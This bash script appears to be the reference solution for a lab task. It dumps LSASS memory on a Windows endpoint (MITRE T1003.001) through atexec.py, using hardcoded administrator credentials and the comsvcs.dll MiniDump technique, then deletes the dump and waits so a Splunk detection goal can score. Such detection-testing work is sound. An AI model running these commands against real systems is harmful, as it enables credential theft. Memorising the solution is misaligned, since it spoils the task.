#!/bin/bash
# Reference for execute-and-confirm-t1003-001, run on the attack box: execute
# T1003.001 (LSASS memory, the comsvcs MiniDump lolbas) ON the endpoint as
# SYSTEM over the declared in-lab exec surface, then wait past the telemetry
# pipeline (sysmon -> forwarder -> splunk index -> the collector's poll +
# meta flush) so the detection goal scores from the exported stream. No
# SUBMIT: detection goals score by observation, not submission.
set -euo pipefail

WIN=10.0.2.11
SPLUNK=10.0.2.10

deadline=$(( $(date +%s) + 600 ))
until nc -z -w3 "$WIN" 445 && nc -z -w3 "$SPLUNK" 8000 && nc -z -w3 "$SPLUNK" 9997; do
  [ "$(date +%s)" -lt "$deadline" ] || { echo "the surfaces never converged" >&2; exit 1; }
  sleep 10
done

echo "step: lsass pid" >&2
pid_out=$(timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
  'powershell -NoProfile -Command (Get-Process lsass).Id' 2>&1 || true)
lsass_pid=$(grep -oE '^[0-9]+\s*$' <<<"$pid_out" | head -1 | tr -d '[:space:]' || true)
[ -n "$lsass_pid" ] || { echo "no lsass pid" >&2; tail -5 <<<"$pid_out" >&2; exit 1; }

echo "step: minidump (T1003.001)" >&2
timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
  "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump $lsass_pid C:\\Windows\\Temp\\l.dmp full" >/dev/null 2>&1 || true
sleep 3
timeout 180 atexec.py 'Administrator:changeme123!@'"$WIN" \
  'cmd /c del /f /q C:\Windows\Temp\l.dmp' >/dev/null 2>&1 || true

# the pipeline settle: forwarder ship + index + >=2 collector polls + a meta
# flush (poll_s 2, meta_flush 15); generous because an incomplete window is
# indeterminate, not a pass
echo "step: telemetry settle" >&2
sleep 45
echo "T1003.001 executed; the detection goal scores from the exported stream" >&2
